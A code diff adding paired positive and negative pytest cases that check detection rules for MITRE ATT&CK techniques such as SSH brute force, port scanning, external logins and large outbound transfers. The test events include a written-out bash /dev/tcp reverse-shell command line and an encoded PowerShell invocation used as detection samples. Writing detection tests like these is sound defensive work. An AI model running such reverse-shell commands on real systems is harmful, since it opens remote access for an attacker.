@@ -209,6 +209,241 @@ class TestKnownPositiveCases:
 
 
 # ---------------------------------------------------------------------------
+# Priority MITRE ATT&CK coverage — paired positive + negative tests for the
+# 8 priority tactics listed in docs/proof/mitre-rule-validation.md.
+#
+# Each test fires an event shape the rule expects (positive) and a benign
+# variant (negative). Together, the pair proves the rule actually selects
+# the right events without firing on look-alikes.
+# ---------------------------------------------------------------------------
+
+
+def _rule(rule_id: str) -> DetectionRule:
+    """Return the rule with *rule_id* or pytest.skip if it is not loaded."""
+    rule = next((r for r in DETECTION_RULES if r.rule_id == rule_id), None)
+    if rule is None:
+        pytest.skip(f"{rule_id} not registered in this build")
+    return rule
+
+
+class TestPriorityMITRECoverage:
+    """One paired positive + negative behavioural test per priority technique."""
+
+    # --- Credential Access ------------------------------------------------
+
+    def test_T1110_001_ssh_brute_force_fires(self):
+        """RULE-006 (SSH Brute Force): >20 SSH auth failures from one source/10min."""
+        rule = _rule("RULE-006")
+        ts_base = datetime.now(timezone.utc)
+        events = [
+            {
+                "timestamp": (ts_base + timedelta(seconds=i * 5)).isoformat(),
+                "log_source": "authentication",
+                "event_type": "logon_failure",
+                "user": "root",
+                "src_ip": "203.0.113.42",
+                "raw_data": {"protocol": "ssh"},
+                "host": "linux-bastion",
+            }
+            for i in range(25)
+        ]
+        assert rule.condition(events), "RULE-006 must fire on 25 SSH failures"
+
+    def test_T1110_001_ssh_brute_force_negative_below_threshold(self):
+        """RULE-006: 5 SSH failures (below 20-threshold) must NOT fire."""
+        rule = _rule("RULE-006")
+        ts_base = datetime.now(timezone.utc)
+        events = [
+            {
+                "timestamp": (ts_base + timedelta(seconds=i * 5)).isoformat(),
+                "log_source": "authentication",
+                "event_type": "logon_failure",
+                "user": "root",
+                "src_ip": "203.0.113.42",
+                "raw_data": {"protocol": "ssh"},
+                "host": "linux-bastion",
+            }
+            for i in range(5)
+        ]
+        assert rule.condition(events) == []
+
+    # --- Execution --------------------------------------------------------
+
+    def test_T1059_reverse_shell_fires(self):
+        """RULE-008 (Suspicious Process): bash -i / dev tcp reverse shell."""
+        rule = _rule("RULE-008")
+        ts = _now()
+        events = [{
+            "timestamp": ts,
+            "log_source": "process",
+            "event_type": "process_create",
+            "command_line": "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1",
+            "host": "WIN-DC-01",
+            "user": "attacker",
+        }]
+        assert rule.condition(events), "RULE-008 must fire on reverse-shell command"
+
+    def test_T1059_powershell_encoded_fires(self):
+        """RULE-008: PowerShell -EncodedCommand base64 payload."""
+        rule = _rule("RULE-008")
+        ts = _now()
+        events = [{
+            "timestamp": ts,
+            "log_source": "process",
+            "event_type": "process_create",
+            "command_line": (
+                "powershell.exe -NoProfile -EncodedCommand "
+                "JABzAD0AKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQA"
+            ),
+            "host": "WS01",
+            "user": "alice",
+        }]
+        assert rule.condition(events), "RULE-008 must fire on encoded PowerShell"
+
+    def test_T1059_negative_legit_powershell(self):
+        """RULE-008: harmless PowerShell `Get-Date` must NOT fire."""
+        rule = _rule("RULE-008")
+        ts = _now()
+        events = [{
+            "timestamp": ts,
+            "log_source": "process",
+            "event_type": "process_create",
+            "command_line": "powershell.exe -Command Get-Date",
+            "host": "WS01",
+            "user": "alice",
+        }]
+        assert rule.condition(events) == []
+
+    # --- Privilege Escalation --------------------------------------------
+
+    def test_T1548_sudo_fires(self):
+        """RULE-007: privilege-escalation utility `sudo` must fire."""
+        rule = _rule("RULE-007")
+        ts = _now()
+        events = [{
+            "timestamp": ts,
+            "log_source": "process",
+            "event_type": "process_create",
+            "command_line": "sudo -i",
+            "host": "linux-host",
+            "user": "alice",
+        }]
+        assert rule.condition(events), "RULE-007 must fire on sudo"
+
+    def test_T1548_negative_no_escalation_command(self):
+        """RULE-007: a regular `ls` must NOT fire."""
+        rule = _rule("RULE-007")
+        ts = _now()
+        events = [{
+            "timestamp": ts,
+            "log_source": "process",
+            "event_type": "process_create",
+            "command_line": "ls -la /tmp",
+            "host": "linux-host",
+            "user": "alice",
+        }]
+        assert rule.condition(events) == []
+
+    # --- Discovery --------------------------------------------------------
+
+    def test_T1046_port_scan_fires(self):
+        """RULE-005: > 10 distinct destination ports from same source/60s."""
+        rule = _rule("RULE-005")
+        ts_base = datetime.now(timezone.utc)
+        events = [
+            {
+                "timestamp": (ts_base + timedelta(seconds=i)).isoformat(),
+                "log_source": "network",
+                "event_type": "connection",
+                "src_ip": "203.0.113.42",
+                "raw_data": {"dst_port": 1000 + i},
+                "host": "fw-01",
+            }
+            for i in range(15)
+        ]
+        assert rule.condition(events), "RULE-005 must fire on 15-port scan"
+
+    def test_T1046_negative_few_ports(self):
+        """RULE-005: 5 distinct destination ports must NOT fire."""
+        rule = _rule("RULE-005")
+        ts_base = datetime.now(timezone.utc)
+        events = [
+            {
+                "timestamp": (ts_base + timedelta(seconds=i)).isoformat(),
+                "log_source": "network",
+                "event_type": "connection",
+                "src_ip": "203.0.113.42",
+                "raw_data": {"dst_port": 1000 + i},
+                "host": "fw-01",
+            }
+            for i in range(5)
+        ]
+        assert rule.condition(events) == []
+
+    # --- Initial Access / Cloud Identity ---------------------------------
+
+    def test_T1078_external_login_fires(self):
+        """RULE-003: successful login from a public IP must fire."""
+        rule = _rule("RULE-003")
+        ts = _now()
+        events = [{
+            "timestamp": ts,
+            "log_source": "authentication",
+            "event_type": "logon_success",
+            "user": "alice",
+            "src_ip": "203.0.113.42",   # public IP
+            "host": "WIN-DC-01",
+        }]
+        assert rule.condition(events), "RULE-003 must fire on public-IP login"
+
+    def test_T1078_negative_internal_login(self):
+        """RULE-003: login from RFC1918 must NOT fire."""
+        rule = _rule("RULE-003")
+        ts = _now()
+        events = [{
+            "timestamp": ts,
+            "log_source": "authentication",
+            "event_type": "logon_success",
+            "user": "alice",
+            "src_ip": "10.0.0.5",   # private IP
+            "host": "WIN-DC-01",
+        }]
+        assert rule.condition(events) == []
+
+    # --- Exfiltration -----------------------------------------------------
+
+    def test_T1048_large_outbound_fires(self):
+        """RULE-009: outbound flow > 100 MB must fire."""
+        rule = _rule("RULE-009")
+        ts = _now()
+        events = [{
+            "timestamp": ts,
+            "log_source": "network",
+            "event_type": "connection",
+            "src_ip": "10.0.0.5",
+            "dst_ip": "203.0.113.99",
+            "raw_data": {"bytes_out": 250 * 1024 * 1024},   # 250 MB
+            "host": "WS01",
+        }]
+        assert rule.condition(events), "RULE-009 must fire on 250 MB outbound"
+
+    def test_T1048_negative_small_outbound(self):
+        """RULE-009: 1 MB outbound must NOT fire."""
+        rule = _rule("RULE-009")
+        ts = _now()
+        events = [{
+            "timestamp": ts,
+            "log_source": "network",
+            "event_type": "connection",
+            "src_ip": "10.0.0.5",
+            "dst_ip": "203.0.113.99",
+            "raw_data": {"bytes_out": 1 * 1024 * 1024},   # 1 MB
+            "host": "WS01",
+        }]
+        assert rule.condition(events) == []
+
+
+# ---------------------------------------------------------------------------
 # Engine-level integration check — the engine itself must produce alerts
 # from a curated event stream without any rule raising
 # ---------------------------------------------------------------------------
